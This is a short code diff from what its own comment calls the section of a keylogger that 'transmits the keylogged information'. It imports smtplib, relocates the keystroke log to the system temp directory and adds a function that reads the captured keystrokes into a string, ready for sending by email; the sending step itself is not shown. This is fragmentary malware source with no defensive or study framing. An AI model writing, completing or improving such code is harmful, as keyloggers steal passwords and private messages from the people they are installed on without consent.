@@ -1,9 +1,13 @@
 #this section transmits the keylogged information
 
 import smtplib
+import os
+import tempfile
+
+log_path = os.path.join(tempfile.gettempdir(), "log.txt")
 
 def readtostr():
-    with open("log.txt", 'r') as reader:
+    with open(log_path, 'r') as reader:
         logtxt=reader.read()
         return logtxt
     
